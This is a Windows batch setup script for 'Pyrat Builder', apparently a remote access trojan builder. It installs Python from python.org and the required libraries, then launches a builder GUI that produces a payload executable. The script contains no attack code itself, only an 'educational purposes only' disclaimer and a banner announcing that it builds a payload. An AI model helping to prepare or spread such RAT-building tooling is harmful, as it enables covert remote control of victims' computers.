@echo off
title PotatoKing Pyrat Builder - Setup
cls

color 0B
echo                             __
echo ______ ___.__.____________ _/  ^|_
echo \____ ^<   ^|  ^|\_  __ \__  \\   __\
echo ^|  ^|_^> ^>___  ^| ^|  ^| \// __ \^|  ^|
echo ^|   __// ____^| ^|__^|  (____  /__^|
echo ^|__^|   \/                 \/
echo.
echo                  Pyrat - Setup
echo.
echo =================================================================
echo.
echo  This script will prepare your environment to build the Pyrat
echo  payload. It verifies your Python installation and installs
echo  all required libraries automatically.
echo.
echo  Official Website: https://pyrat.site/
echo  Developer: PotatoKing (https://potatoking.net)
echo.
echo  DISCLAIMER: This software is for educational purposes only.
echo  The developer is not responsible for any misuse.
echo.
echo =================================================================
pause
cls

echo [*] Checking for Python installation...
where python >nul 2>nul
if %ERRORLEVEL% neq 0 (
    echo [!] Python not found in PATH.
    echo [*] Downloading Python 3.11...
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.4/python-3.11.4-amd64.exe' -OutFile 'python_installer.exe'"
    echo [*] Installing Python... Please accept any UAC prompts.
    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
    del python_installer.exe
    echo [+] Python installed successfully.
    echo [*] Note: If Python commands fail below, please close and re-run this script to refresh the system PATH.
) else (
    echo [+] Python is already installed.
)

echo.
echo ==========================================================
echo.

echo [*] Installing required libraries...
python -m pip install --upgrade pip >nul
python -m pip install -r requirements.txt
if %ERRORLEVEL% neq 0 (
    echo [!] Failed to install libraries. Please check your internet connection and try again.
    pause
    exit /b
)
echo [+] All libraries installed successfully.

echo.
echo ==========================================================
echo.
echo [*] Launching Pyrat Builder GUI...
python builder.py
echo.
echo [*] Builder closed. You can find the built executable in the 'dist' folder.
pause
